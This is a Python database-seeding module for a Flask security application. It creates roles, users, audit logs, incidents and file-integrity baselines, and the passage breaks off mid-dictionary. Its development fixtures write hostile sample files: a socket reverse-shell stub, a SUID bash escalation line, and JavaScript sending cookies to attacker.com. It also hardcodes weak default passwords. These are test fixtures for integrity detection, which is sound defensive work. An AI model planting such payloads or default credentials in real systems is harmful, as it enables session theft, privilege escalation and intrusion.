"""
Database seeding module for myproject.

This module provides functionality for populating the database with initial data
required for application operation. It creates default users, test data, and
reference values needed for development, testing, and initial deployment.

Database seeding is typically performed:
- During initial application setup
- When setting up development environments
- During testing to ensure consistent test data
- When deploying to new environments

The module implements idempotent seeding operations that can be safely run
multiple times without creating duplicate data.

Key functions:
- seed_database: Core function to seed essential data for all environments
- seed_development_data: Additional sample data for development environments
- seed_test_data: Minimal data specifically for test environments
"""

import os
import random
import hashlib
import json
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Tuple, Optional, Any
import logging
from pathlib import Path
from flask import current_app
import click
from sqlalchemy.exc import SQLAlchemyError
import glob
import fnmatch
import importlib

from extensions import db
from models import AuditLog, Permission, Role, SecurityIncident, SystemConfig, User


def seed_database(force: bool = False, verbose: bool = False) -> bool:
    """
    Seed the database with initial required data.

    This function creates necessary initial data for the application to function:
    - Admin user
    - Test users
    - Sample audit logs
    - Security incidents
    - System configuration settings
    - File integrity baselines

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        bool: True if seeding was successful, False if an error occurred

    Example:
        # Seed database during application initialization
        with app.app_context():
            success = seed_database(verbose=True)
    """
    try:
        if verbose:
            print("Starting database seeding process...")

        # Check if database is already seeded
        if not force and is_database_seeded():
            if verbose:
                print("Database already contains seed data. Use --force to override.")
            return True

        # Create roles and permissions first (required for users)
        roles = seed_roles_and_permissions(verbose)

        # Create users
        admin_user = seed_admin_user(force, verbose)
        test_users = seed_test_users(force, verbose)

        # Create reference and sample data
        seed_system_config(force, verbose)
        seed_audit_logs(admin_user.id if admin_user else None, force, verbose)
        seed_security_incidents(force, verbose)

        # Create file integrity baselines for testing
        seed_file_integrity_data(force, verbose)

        if verbose:
            print("✅ Database seeding completed successfully")
        return True

    except SQLAlchemyError as e:
        db.session.rollback()
        error_msg = f"Database seeding error: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False
    except Exception as e:
        db.session.rollback()
        error_msg = f"Unexpected error during database seeding: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False


def is_database_seeded() -> bool:
    """
    Check if the database already has seed data by looking for admin user.

    Returns:
        bool: True if database appears to be seeded, False otherwise
    """
    try:
        admin_exists = User.query.filter_by(username='admin').first() is not None
        return admin_exists
    except SQLAlchemyError:
        # If we can't query the database, assume it's not seeded
        return False


def seed_roles_and_permissions(verbose: bool = False) -> Dict[str, Role]:
    """
    Create basic roles and permissions in the database.

    Args:
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary of created role objects keyed by role name
    """
    if verbose:
        print("Creating roles and permissions...")

    # Define permissions
    permissions = {
        'view_users': Permission.create_or_update('view_users', 'Can view user list'),
        'manage_users': Permission.create_or_update('manage_users', 'Can create/edit users'),
        'view_logs': Permission.create_or_update('view_logs', 'Can view audit logs'),
        'manage_system': Permission.create_or_update('manage_system', 'Can modify system configuration'),
        'manage_security': Permission.create_or_update('manage_security', 'Can manage security incidents'),
        'view_metrics': Permission.create_or_update('view_metrics', 'Can view system metrics'),
        'manage_file_integrity': Permission.create_or_update('manage_file_integrity', 'Can manage file integrity monitoring'),
    }

    # Define roles and their permissions
    roles = {
        'admin': {
            'description': 'Administrator with full access',
            'permissions': list(permissions.values())
        },
        'manager': {
            'description': 'Manager with limited administrative access',
            'permissions': [
                permissions['view_users'],
                permissions['view_logs'],
                permissions['manage_security'],
                permissions['view_metrics']
            ]
        },
        'user': {
            'description': 'Standard user',
            'permissions': [
                permissions['view_logs'],
                permissions['view_metrics']
            ]
        },
        'security_analyst': {
            'description': 'Security analyst with specialized permissions',
            'permissions': [
                permissions['view_logs'],
                permissions['view_metrics'],
                permissions['manage_security'],
                permissions['manage_file_integrity']
            ]
        }
    }

    role_objects = {}

    # Create roles and assign permissions
    for role_name, role_info in roles.items():
        role = Role.query.filter_by(name=role_name).first()
        if not role:
            role = Role(name=role_name, description=role_info['description'])
            db.session.add(role)

        # Assign permissions to role
        role.permissions = role_info['permissions']
        role_objects[role_name] = role

    db.session.commit()

    if verbose:
        print(f"Created {len(role_objects)} roles with permissions")

    return role_objects


def seed_admin_user(force: bool = False, verbose: bool = False) -> Optional[User]:
    """
    Create the default admin user if it doesn't exist.

    Args:
        force: If True, will recreate admin user even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        User: The admin user object or None if creation failed
    """
    if verbose:
        print("Creating admin user...")

    # Get admin role
    admin_role = Role.query.filter_by(name='admin').first()
    if not admin_role:
        if verbose:
            print("Warning: Admin role not found. Creating admin user without role.")

    # Check if admin user exists
    admin_user = User.query.filter_by(username='admin').first()

    if admin_user and force:
        # Delete existing admin user if forcing recreation
        db.session.delete(admin_user)
        db.session.commit()
        admin_user = None

    if not admin_user:
        admin_user = User(
            username='admin',
            email='admin@example.com',
            first_name='Admin',
            last_name='User',
            active=True,
            created_at=datetime.now(timezone.utc)
        )
        admin_user.set_password('admin123')  # This should be changed after deployment

        if admin_role:
            admin_user.roles = [admin_role]

        db.session.add(admin_user)
        db.session.commit()

        if verbose:
            print("Created admin user with username 'admin'")
    elif verbose:
        print("Admin user already exists")

    return admin_user


def seed_test_users(force: bool = False, verbose: bool = False) -> List[User]:
    """
    Create test users for development environments.

    Args:
        force: If True, will recreate test users even if they already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created test user objects
    """
    if verbose:
        print("Creating test users...")

    # Get roles
    roles = {
        'manager': Role.query.filter_by(name='manager').first(),
        'user': Role.query.filter_by(name='user').first(),
        'security_analyst': Role.query.filter_by(name='security_analyst').first()
    }

    test_users = [
        {
            'username': 'manager',
            'email': 'manager@example.com',
            'password': 'manager123',
            'first_name': 'Test',
            'last_name': 'Manager',
            'role': 'manager'
        },
        {
            'username': 'user1',
            'email': 'user1@example.com',
            'password': 'user123',
            'first_name': 'Test',
            'last_name': 'User',
            'role': 'user'
        },
        {
            'username': 'user2',
            'email': 'user2@example.com',
            'password': 'user123',
            'first_name': 'Another',
            'last_name': 'User',
            'role': 'user'
        },
        {
            'username': 'security',
            'email': 'security@example.com',
            'password': 'security123',
            'first_name': 'Security',
            'last_name': 'Analyst',
            'role': 'security_analyst'
        }
    ]

    created_users = []

    for user_data in test_users:
        username = user_data['username']
        user = User.query.filter_by(username=username).first()

        if user and force:
            # Delete existing user if forcing recreation
            db.session.delete(user)
            db.session.commit()
            user = None

        if not user:
            user = User(
                username=username,
                email=user_data['email'],
                first_name=user_data['first_name'],
                last_name=user_data['last_name'],
                active=True,
                created_at=datetime.now(timezone.utc)
            )
            user.set_password(user_data['password'])

            # Assign role if it exists
            role_name = user_data['role']
            if role_name in roles and roles[role_name]:
                user.roles = [roles[role_name]]

            db.session.add(user)
            created_users.append(user)

            if verbose:
                print(f"Created test user: {username}")

    db.session.commit()

    if verbose:
        print(f"Created {len(created_users)} test users")

    return created_users


def seed_audit_logs(admin_id: Optional[int] = None, force: bool = False, verbose: bool = False) -> List[AuditLog]:
    """
    Create sample audit logs.

    Args:
        admin_id: ID of admin user to use for logs, if available
        force: If True, will recreate logs even if they already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created audit log objects
    """
    if verbose:
        print("Creating sample audit logs...")

    # Check if audit logs already exist
    existing_logs_count = AuditLog.query.count()
    if existing_logs_count > 0 and not force:
        if verbose:
            print(f"Skipping audit log creation, {existing_logs_count} logs already exist")
        return []
    elif force and existing_logs_count > 0:
        if verbose:
            print(f"Clearing {existing_logs_count} existing audit logs")
        AuditLog.query.delete()
        db.session.commit()

    # Define sample log events
    log_events = [
        ('user_login', 'User logged in successfully', 'auth', 'info'),
        ('user_logout', 'User logged out', 'auth', 'info'),
        ('login_failed', 'Invalid password provided', 'auth', 'warning'),
        ('password_reset', 'User requested password reset', 'auth', 'info'),
        ('system_startup', 'Application services started', 'system', 'info'),
        ('system_config_change', 'Database connection settings updated', 'system', 'warning'),
        ('security_alert', 'Multiple failed login attempts detected', 'security', 'critical'),
        ('database_backup', 'Automated backup completed successfully', 'maintenance', 'info'),
        ('api_rate_limit', 'Too many requests from client', 'api', 'warning'),
        ('user_registered', 'User account created', 'user', 'info'),
        # New event types for file integrity monitoring
        ('file_integrity', 'File integrity check completed', 'security', 'info'),
        ('file_modified', 'Critical system file modified', 'security', 'critical'),
        ('file_permission_change', 'File permissions changed unexpectedly', 'security', 'warning'),
        ('baseline_updated', 'File integrity baseline updated', 'security', 'info'),
        ('suspicious_file', 'Suspicious file detected', 'security', 'critical')
    ]

    created_logs = []

    # Create logs over the past 7 days
    now = datetime.now(timezone.utc)
    for i in range(50):  # Create 50 sample logs
        # Randomly select an event
        event_name, event_desc, category, level = random.choice(log_events)

        # Generate a random timestamp within the past 7 days
        days_ago = random.randint(0, 7)
        hours_ago = random.randint(0, 23)
        minutes_ago = random.randint(0, 59)
        timestamp = now - timedelta(days=days_ago, hours=hours_ago, minutes=minutes_ago)

        # Create the audit log entry
        log_entry = AuditLog(
            timestamp=timestamp,
            event=event_name,
            description=event_desc,
            category=category,
            level=level,
            user_id=admin_id if random.choice([True, False]) else None  # Randomly assign to admin or None
        )

        db.session.add(log_entry)
        created_logs.append(log_entry)

    db.session.commit()

    if verbose:
        print(f"Created {len(created_logs)} audit log entries")

    return created_logs


def seed_security_incidents(force: bool = False, verbose: bool = False) -> List[SecurityIncident]:
    """
    Create sample security incidents.

    Args:
        force: If True, will recreate incidents even if they already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created security incident objects
    """
    if verbose:
        print("Creating sample security incidents...")

    # Check if incidents already exist
    existing_incidents_count = SecurityIncident.query.count()
    if existing_incidents_count > 0 and not force:
        if verbose:
            print(f"Skipping security incident creation, {existing_incidents_count} incidents already exist")
        return []
    elif force and existing_incidents_count > 0:
        if verbose:
            print(f"Clearing {existing_incidents_count} existing security incidents")
        SecurityIncident.query.delete()
        db.session.commit()

    # Define sample incidents
    incident_data = [
        {
            'title': 'Suspicious Login Attempts',
            'description': 'Multiple failed login attempts from unusual IP addresses',
            'severity': 'medium',
            'status': 'resolved',
            'days_ago': 15
        },
        {
            'title': 'Potential SQL Injection Attempt',
            'description': 'Malformed SQL query detected in user input fields',
            'severity': 'high',
            'status': 'investigation',
            'days_ago': 2
        },
        {
            'title': 'Unauthorized Access Attempt',
            'description': 'Attempt to access restricted API endpoints without valid credentials',
            'severity': 'medium',
            'status': 'resolved',
            'days_ago': 7
        },
        {
            'title': 'Data Export Volume Anomaly',
            'description': 'Unusual volume of data exported by authorized user',
            'severity': 'low',
            'status': 'monitoring',
            'days_ago': 1
        },
        {
            'title': 'DDoS Attack Identified',
            'description': 'Distributed denial of service attack against authentication service',
            'severity': 'critical',
            'status': 'resolved',
            'days_ago': 30
        },
        # New incidents for file integrity issues
        {
            'title': 'Configuration File Modified',
            'description': 'Unauthorized modification detected in system configuration files',
            'severity': 'high',
            'status': 'investigation',
            'days_ago': 1
        },
        {
            'title': 'Suspicious File Created',
            'description': 'Suspicious executable file detected in system directory',
            'severity': 'critical',
            'status': 'active',
            'days_ago': 0
        }
    ]

    now = datetime.now(timezone.utc)
    created_incidents = []

    for data in incident_data:
        # Calculate timestamps
        detected_at = now - timedelta(days=data['days_ago'])
        resolved_at = None
        if data['status'] == 'resolved':
            resolution_days = random.randint(1, 3)  # Resolved 1-3 days after detection
            resolved_at = detected_at + timedelta(days=resolution_days)

        incident = SecurityIncident(
            title=data['title'],
            description=data['description'],
            severity=data['severity'],
            status=data['status'],
            detected_at=detected_at,
            resolved_at=resolved_at
        )

        db.session.add(incident)
        created_incidents.append(incident)

    db.session.commit()

    if verbose:
        print(f"Created {len(created_incidents)} security incidents")

    return created_incidents


def seed_system_config(force: bool = False, verbose: bool = False) -> List[SystemConfig]:
    """
    Create essential system configuration settings.

    Args:
        force: If True, will recreate settings even if they already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created system config objects
    """
    if verbose:
        print("Creating system configuration settings...")

    # Define default configuration
    default_configs = [
        ('maintenance_mode', 'false', 'system', 'Flag to enable/disable maintenance mode'),
        ('session_timeout', '30', 'security', 'Session timeout in minutes'),
        ('max_login_attempts', '5', 'security', 'Maximum failed login attempts before lockout'),
        ('password_expiry_days', '90', 'security', 'Number of days before passwords expire'),
        ('backup_retention_days', '30', 'maintenance', 'Number of days to retain database backups'),
        ('allowed_file_extensions', 'jpg,png,pdf,docx,xlsx', 'security', 'Allowed file upload extensions'),
        ('enable_audit_logging', 'true', 'system', 'Enable detailed audit logging'),
        # New configuration settings for file integrity monitoring
        ('enable_file_integrity_monitoring', 'true', 'security', 'Enable file integrity monitoring'),
        ('file_integrity_check_frequency', '100', 'security', 'Perform integrity check every N requests'),
        ('auto_update_baseline', 'false', 'security', 'Automatically update baseline for non-critical changes'),
        ('check_file_signatures', 'true', 'security', 'Verify digital signatures on executable files'),
        ('file_hash_algorithm', 'sha256', 'security', 'Algorithm used for file hashing')
    ]

    created_configs = []

    for key, value, category, description in default_configs:
        config = SystemConfig.query.filter_by(key=key).first()

        if config and force:
            # Update existing config if force is True
            config.value = value
            config.updated_at = datetime.now(timezone.utc)
            if verbose:
                print(f"Updated system config: {key}={value}")
        elif not config:
            # Create new config
            config = SystemConfig(
                key=key,
                value=value,
                category=category,
                description=description,
                created_at=datetime.now(timezone.utc)
            )
            db.session.add(config)
            created_configs.append(config)
            if verbose:
                print(f"Created system config: {key}={value}")

    db.session.commit()

    if verbose:
        print(f"Created/updated {len(created_configs)} system configuration settings")

    return created_configs


def seed_file_integrity_data(force: bool = False, verbose: bool = False) -> Dict[str, Any]:
    """
    Create file integrity monitoring test data.

    This function creates a sample file integrity baseline for testing the
    file integrity monitoring system. It includes:
    - Creating test files
    - Generating hash baseline
    - Creating audit logs for file integrity events

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary with created baseline and test data
    """
    if verbose:
        print("Creating file integrity test data...")

    # Check if app is available through Flask current_app
    if not hasattr(current_app, '_get_current_object'):
        if verbose:
            print("Skipping file integrity data seeding - no application context")
        return {}

    try:
        # Define test files and directory to create
        test_dir = os.path.join(current_app.instance_path, 'integrity_test')
        os.makedirs(test_dir, exist_ok=True)

        # Create test files
        test_files = {
            'config.ini': '[app]\nenabled = true\ndebug = false\n\n[security]\nintegrity_check = true',
            'system.py': '#!/usr/bin/env python\n\nprint("System check running")\n\nimport os\nos.system("echo System checked")',
            'secure.json': '{\n  "token": "SAMPLE_TOKEN_12345",\n  "enabled": true,\n  "options": ["scan", "monitor"]\n}'
        }

        # Create the files and compute hashes
        file_hashes = {}
        for filename, content in test_files.items():
            file_path = os.path.join(test_dir, filename)

            # Create the file if it doesn't exist or force is True
            if force or not os.path.exists(file_path):
                with open(file_path, 'w') as f:
                    f.write(content)

                # Make Python files executable
                if filename.endswith('.py'):
                    os.chmod(file_path, 0o755)

                if verbose:
                    print(f"Created test file: {filename}")

            # Compute hash for file integrity baseline
            file_hash = calculate_file_hash(file_path)
            rel_path = os.path.relpath(file_path, current_app.root_path)
            file_hashes[rel_path] = file_hash

        # Store baseline to app config
        if 'CRITICAL_FILE_HASHES' not in current_app.config or force:
            current_app.config['CRITICAL_FILE_HASHES'] = {}

        # Add our test files to the monitored files
        current_app.config['CRITICAL_FILE_HASHES'].update(file_hashes)

        # Create a baseline file
        baseline_path = os.path.join(current_app.instance_path, 'file_baseline.json')
        with open(baseline_path, 'w') as f:
            json.dump(file_hashes, f, indent=2)

        if verbose:
            print(f"Created file integrity baseline with {len(file_hashes)} files")

        # Create audit logs for file integrity events
        seed_file_integrity_audit_logs(force, verbose)

        return {
            'baseline_path': baseline_path,
            'test_dir': test_dir,
            'file_hashes': file_hashes
        }
    except Exception as e:
        logging.error(f"Error creating file integrity test data: {str(e)}")
        if verbose:
            print(f"Error creating file integrity test data: {str(e)}")
        return {}


def seed_file_integrity_audit_logs(force: bool = False, verbose: bool = False) -> List[AuditLog]:
    """
    Create audit logs specific to file integrity monitoring.

    Args:
        force: If True, will create logs even if many already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created audit log objects
    """
    if verbose:
        print("Creating file integrity audit logs...")

    # File integrity event types
    file_events = [
        {
            'event': 'file_integrity',
            'description': 'File integrity check completed successfully',
            'level': 'info',
            'details': {'files_checked': 152, 'modified': 0, 'missing': 0}
        },
        {
            'event': 'file_modified',
            'description': 'System configuration file modified',
            'level': 'critical',
            'details': {
                'path': 'config/system.ini',
                'status': 'modified',
                'severity': 'high',
                'old_hash': '5d41402abc4b2a76b9719d911017c592',
                'new_hash': 'aaf4c61ddcc5e8a2dabede0f3b482cd9'
            }
        },
        {
            'event': 'file_permission_change',
            'description': 'File permissions changed unexpectedly',
            'level': 'warning',
            'details': {
                'path': 'scripts/backup.sh',
                'status': 'permission_changed',
                'severity': 'medium',
                'old_mode': '644',
                'new_mode': '777'
            }
        },
        {
            'event': 'suspicious_file',
            'description': 'Suspicious file detected in system directory',
            'level': 'critical',
            'details': {
                'path': '/tmp/systemd-private-hack.sh',
                'status': 'suspicious_new_file',
                'severity': 'critical'
            }
        },
        {
            'event': 'baseline_updated',
            'description': 'File integrity baseline updated automatically',
            'level': 'info',
            'details': {
                'files_updated': 3,
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
        }
    ]

    created_logs = []
    now = datetime.now(timezone.utc)

    # Get users for attribution
    security_users = User.query.filter(
        User.roles.any(Role.name.in_(['admin', 'security_analyst']))
    ).all()

    user_ids = [user.id for user in security_users] if security_users else [None]

    # Create a few entries for each event type
    for event_data in file_events:
        # Create 1-3 logs for each event type
        for i in range(random.randint(1, 3)):
            # Generate timestamp in past 30 days
            days_ago = random.randint(0, 30)
            hours_ago = random.randint(0, 23)
            timestamp = now - timedelta(days=days_ago, hours=hours_ago)

            # Create audit log entry
            log_entry = AuditLog(
                timestamp=timestamp,
                event=event_data['event'],
                description=event_data['description'],
                category='security',  # All file integrity events are security related
                level=event_data['level'],
                user_id=random.choice(user_ids),
                details=json.dumps(event_data['details']) if event_data.get('details') else None
            )

            db.session.add(log_entry)
            created_logs.append(log_entry)

    db.session.commit()

    if verbose:
        print(f"Created {len(created_logs)} file integrity audit logs")

    return created_logs


def seed_development_data(force: bool = False, verbose: bool = False) -> bool:
    """
    Seed additional data for development environments.
    This includes more sample data than would be used in production seeding.

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        bool: True if seeding was successful, False if an error occurred
    """
    try:
        if verbose:
            print("Starting development data seeding...")

        # Add more test users with different roles
        seed_additional_users(force, verbose)

        # Add more sample data specific to development
        seed_extensive_audit_logs(force, verbose)

        # Create development file integrity data
        seed_development_file_integrity_data(force, verbose)

        if verbose:
            print("✅ Development data seeding completed successfully")
        return True

    except SQLAlchemyError as e:
        db.session.rollback()
        error_msg = f"Development data seeding error: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False
    except Exception as e:
        db.session.rollback()
        error_msg = f"Unexpected error during development data seeding: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False


def seed_test_data(force: bool = False, verbose: bool = False) -> bool:
    """
    Seed minimal data suitable for testing environments.

    Unlike development data, test data is more focused on providing
    just enough data to enable test execution without extra samples.
    This function creates smaller datasets optimized for testing speed.

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        bool: True if seeding was successful, False if an error occurred
    """
    try:
        if verbose:
            print("Starting test data seeding...")

        # Add minimal test users (similar to test_users but more focused)
        seed_test_users(force, verbose)

        # Add a minimal set of audit logs for testing security features
        seed_audit_logs(None, force, verbose)

        # Create a simple security incident for testing
        incident_data = {
            'title': 'Test Security Incident',
            'description': 'Security incident created for test environment',
            'severity': 'medium',
            'status': 'active',
            'days_ago': 0
        }

        now = datetime.now(timezone.utc)
        incident = SecurityIncident(
            title=incident_data['title'],
            description=incident_data['description'],
            severity=incident_data['severity'],
            status=incident_data['status'],
            detected_at=now,
            resolved_at=None
        )

        db.session.add(incident)
        db.session.commit()

        if verbose:
            print("Created test security incident")

        # Create basic file integrity data suitable for tests
        test_data = seed_test_file_integrity_data(force, verbose)

        if verbose:
            print("✅ Test data seeding completed successfully")
        return True

    except SQLAlchemyError as e:
        db.session.rollback()
        error_msg = f"Test data seeding error: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False
    except Exception as e:
        db.session.rollback()
        error_msg = f"Unexpected error during test data seeding: {str(e)}"
        logging.error(error_msg)
        print(f"❌ {error_msg}")
        return False


def seed_test_file_integrity_data(force: bool = False, verbose: bool = False) -> Dict[str, Any]:
    """
    Create minimalist file integrity test data for testing environments.

    This creates a very small subset of files specifically for unit and
    integration testing of the file integrity monitoring system.

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary with created test data
    """
    if verbose:
        print("Creating test file integrity data...")

    # Check if app is available through Flask current_app
    if not hasattr(current_app, '_get_current_object'):
        if verbose:
            print("Skipping test file integrity data seeding - no application context")
        return {}

    try:
        # Define test files and directory to create - very minimal for tests
        test_dir = os.path.join(current_app.instance_path, 'integrity_test')
        os.makedirs(test_dir, exist_ok=True)

        # Create test files - just enough for tests to pass
        test_files = {
            'test_config.ini': '[test]\nenabled = true\nmode = test\n',
            'test_script.py': '#!/usr/bin/env python\n\nprint("Test file")\n',
            'test_data.json': '{\n  "test": true,\n  "environment": "testing"\n}'
        }

        # Create the files and compute hashes
        file_hashes = {}
        for filename, content in test_files.items():
            file_path = os.path.join(test_dir, filename)

            # Create the file if it doesn't exist or force is True
            if force or not os.path.exists(file_path):
                with open(file_path, 'w') as f:
                    f.write(content)

                # Make Python files executable
                if filename.endswith('.py'):
                    os.chmod(file_path, 0o755)

                if verbose:
                    print(f"Created test file: {filename}")

            # Compute hash for file integrity baseline
            file_hash = calculate_file_hash(file_path)
            rel_path = os.path.relpath(file_path, current_app.root_path)
            file_hashes[rel_path] = file_hash

        # Store baseline to app config - limited scope for tests
        if 'CRITICAL_FILE_HASHES' not in current_app.config or force:
            current_app.config['CRITICAL_FILE_HASHES'] = {}

        # Add our test files to the monitored files
        current_app.config['CRITICAL_FILE_HASHES'].update(file_hashes)

        # Create a baseline file for tests
        baseline_path = os.path.join(current_app.instance_path, 'test_baseline.json')
        with open(baseline_path, 'w') as f:
            json.dump(file_hashes, f, indent=2)

        if verbose:
            print(f"Created test file integrity baseline with {len(file_hashes)} files")

        return {
            'baseline_path': baseline_path,
            'test_dir': test_dir,
            'file_hashes': file_hashes
        }

    except Exception as e:
        logging.error(f"Error creating test file integrity data: {str(e)}")
        if verbose:
            print(f"Error creating test file integrity data: {str(e)}")
        return {}


def seed_additional_users(force: bool = False, verbose: bool = False) -> List[User]:
    """
    Create additional test users for development environments.

    Args:
        force: If True, will recreate users even if they already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created user objects
    """
    if verbose:
        print("Creating additional development users...")

    # Create 10 more test users
    roles = {
        'admin': Role.query.filter_by(name='admin').first(),
        'manager': Role.query.filter_by(name='manager').first(),
        'user': Role.query.filter_by(name='user').first(),
        'security_analyst': Role.query.filter_by(name='security_analyst').first()
    }

    created_users = []

    for i in range(1, 11):
        # 50% users, 20% managers, 20% security analysts, 10% admins
        role_weights = [('user', 0.5), ('manager', 0.2), ('security_analyst', 0.2), ('admin', 0.1)]
        role_key = random.choices([r[0] for r in role_weights], weights=[r[1] for r in role_weights], k=1)[0]

        username = f"dev_user{i}"

        # Skip if user exists and not forcing recreation
        user = User.query.filter_by(username=username).first()
        if user and not force:
            continue
        elif user and force:
            db.session.delete(user)
            db.session.commit()

        # Create new user
        new_user = User(
            username=username,
            email=f"{username}@example.com",
            first_name=f"Dev{i}",
            last_name=f"User{i}",
            active=True,
            created_at=datetime.now(timezone.utc) - timedelta(days=random.randint(0, 90))
        )
        new_user.set_password("password123")

        # Assign role
        if roles[role_key]:
            new_user.roles = [roles[role_key]]

        db.session.add(new_user)
        created_users.append(new_user)

        if verbose and (i % 5 == 0 or i == 1):
            print(f"Created {i} development users so far...")

    db.session.commit()

    if verbose:
        print(f"Created {len(created_users)} additional development users")

    return created_users


def seed_extensive_audit_logs(force: bool = False, verbose: bool = False) -> List[AuditLog]:
    """
    Create a large number of audit logs for testing pagination and filtering.

    Args:
        force: If True, will create logs even if many already exist
        verbose: If True, will output detailed progress information

    Returns:
        list: The created audit log objects
    """
    if verbose:
        print("Creating extensive audit logs for development...")

    # Check if we already have many logs
    existing_count = AuditLog.query.count()
    if existing_count > 100 and not force:
        if verbose:
            print(f"Skipping extensive log creation, {existing_count} logs already exist")
        return []

    # Log event templates
    log_events = [
        ('user_login', 'User {user} logged in successfully', 'auth', 'info'),
        ('user_logout', 'User {user} logged out', 'auth', 'info'),
        ('login_failed', 'Invalid password provided for {user}', 'auth', 'warning'),
        ('password_changed', 'User {user} changed their password', 'auth', 'info'),
        ('permission_denied', 'User {user} attempted to access unauthorized resource', 'security', 'warning'),
        ('record_created', 'User {user} created a new {resource}', 'data', 'info'),
        ('record_updated', 'User {user} updated {resource} with ID {id}', 'data', 'info'),
        ('record_deleted', 'User {user} deleted {resource} with ID {id}', 'data', 'warning'),
        ('api_request', 'External API request to {endpoint}', 'api', 'info'),
        ('api_error', 'Error in API request to {endpoint}: {error}', 'api', 'error'),
        ('system_alert', '{message}', 'system', 'critical'),
        # Add file integrity specific events
        ('file_integrity', 'Completed file integrity check on {path}', 'security', 'info'),
        ('file_modified', 'Critical file modified: {path}', 'security', 'critical'),
        ('file_missing', 'Expected file missing: {path}', 'security', 'error'),
        ('file_permission', 'File permissions changed: {path}', 'security', 'warning')
    ]

    # Resource types for logs
    resources = ['user', 'report', 'invoice', 'customer', 'order', 'product', 'ticket']

    # File paths for integrity logs
    file_paths = [
        'config/app.ini',
        'config/database.ini',
        'core/security/cs_file_integrity.py',
        'core/security/cs_crypto.py',
        'app.py',
        'scripts/backup.sh',
        '/etc/systemd/system/app.service',
        '/var/log/access.log'
    ]

    # User list for log attribution
    users = User.query.all()
    user_ids = [user.id for user in users] if users else [None]

    # System alert messages
    system_alerts = [
        'Disk space running low',
        'CPU usage exceeded threshold',
        'Memory usage exceeded threshold',
        'Database connection pool nearly exhausted',
        'Background job queue backed up',
        'Redis cache hit ratio below threshold'
    ]

    # API endpoints
    endpoints = [
        '/api/v1/users',
        '/api/v1/auth/token',
        '/api/v1/reports/generate',
        '/api/v1/orders',
        '/api/v1/products',
        '/api/v1/analytics'
    ]

    # API errors
    api_errors = [
        'Connection timeout',
        'Invalid request format',
        'Authentication failed',
        'Rate limit exceeded',
        'Resource not found',
        'Internal server error'
    ]

    created_logs = []
    now = datetime.now(timezone.utc)

    # Create 200 logs over the past 90 days
    for i in range(200):
        # Select random event template
        event_title, event_desc, category, level = random.choice(log_events)

        # Format the description with appropriate values
        formatted_desc = event_desc
        if '{user}' in formatted_desc:
            user = User.query.get(random.choice(user_ids))
            formatted_desc = formatted_desc.replace('{user}', user.username if user else 'unknown')

        if '{resource}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{resource}', random.choice(resources))

        if '{id}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{id}', str(random.randint(1, 1000)))

        if '{endpoint}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{endpoint}', random.choice(endpoints))

        if '{error}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{error}', random.choice(api_errors))

        if '{message}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{message}', random.choice(system_alerts))

        if '{path}' in formatted_desc:
            formatted_desc = formatted_desc.replace('{path}', random.choice(file_paths))

        # Generate a random timestamp within the past 90 days
        days_ago = random.randint(0, 90)
        hours_ago = random.randint(0, 23)
        minutes_ago = random.randint(0, 59)
        timestamp = now - timedelta(days=days_ago, hours=hours_ago, minutes=minutes_ago)

        # Create the audit log entry
        log_entry = AuditLog(
            timestamp=timestamp,
            event=event_title,
            description=formatted_desc,
            category=category,
            level=level,
            user_id=random.choice(user_ids)
        )

        db.session.add(log_entry)
        created_logs.append(log_entry)

        # Commit in batches to avoid memory issues
        if i % 50 == 0:
            db.session.commit()
            if verbose:
                print(f"Created {i} audit logs so far...")

    db.session.commit()

    if verbose:
        print(f"Created {len(created_logs)} additional audit logs for development")

    return created_logs


def seed_development_file_integrity_data(force: bool = False, verbose: bool = False) -> Dict[str, Any]:
    """
    Create various file integrity monitoring scenarios for development testing.

    This function creates a variety of file integrity test cases including:
    - Modified files
    - New suspicious files
    - Permission changes
    - Missing files

    Args:
        force: If True, will recreate data even if it already exists
        verbose: If True, will output detailed progress information

    Returns:
        dict: Dictionary with created test scenarios
    """
    if verbose:
        print("Creating development file integrity scenarios...")

    # Check if app is available
    if not hasattr(current_app, '_get_current_object'):
        if verbose:
            print("Skipping development file integrity scenarios - no application context")
        return {}

    try:
        # Create test directory if it doesn't exist
        test_dir = os.path.join(current_app.instance_path, 'integrity_dev_tests')
        os.makedirs(test_dir, exist_ok=True)

        # Create various test scenarios
        scenarios = {
            # Normal files (should pass integrity checks)
            'normal': {
                'config.yaml': 'debug: false\nenvironment: development\nlog_level: info',
                'app.py': '#!/usr/bin/env python\n\nprint("Application starting")\n',
                'requirements.txt': 'flask==2.0.1\nsqlalchemy==1.4.23\n'
            },

            # Files that should trigger integrity warnings
            'suspicious': {
                'backdoor.py': '#!/usr/bin/env python\nimport socket,subprocess\ns=socket.socket()\n'
                              's.connect(("10.0.0.1",4444))\n',
                'rootkit.sh': '#!/bin/bash\nchmod u+s /bin/bash\n',
                'exploit.js': 'document.cookie.split(";").forEach(function(c) { new Image().src = "http://attacker.com/c?" + c; });'
            },

            # Files that should be flagged for permission issues
            'permissions': {
